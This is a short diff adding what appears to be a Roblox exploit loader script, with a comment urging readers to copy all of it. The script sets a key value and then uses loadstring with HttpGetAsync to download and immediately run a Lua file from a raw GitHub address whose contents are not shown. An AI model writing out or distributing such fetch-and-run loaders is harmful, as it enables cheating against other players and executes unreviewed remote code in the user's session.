@@ -1,0 +1,3 @@
+--MAKE SURE TO COPY THE WHOLE THING!--    --AND REMEMBER KIDS NASA.EXE ON TOP
+_G.Key = "58729375275t8g77fg7F57FD5DFSHUIEFYSG7Tge6g85328rfd"
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Sliqqo-lua/dhm-testing/main/windler.lua", true))();
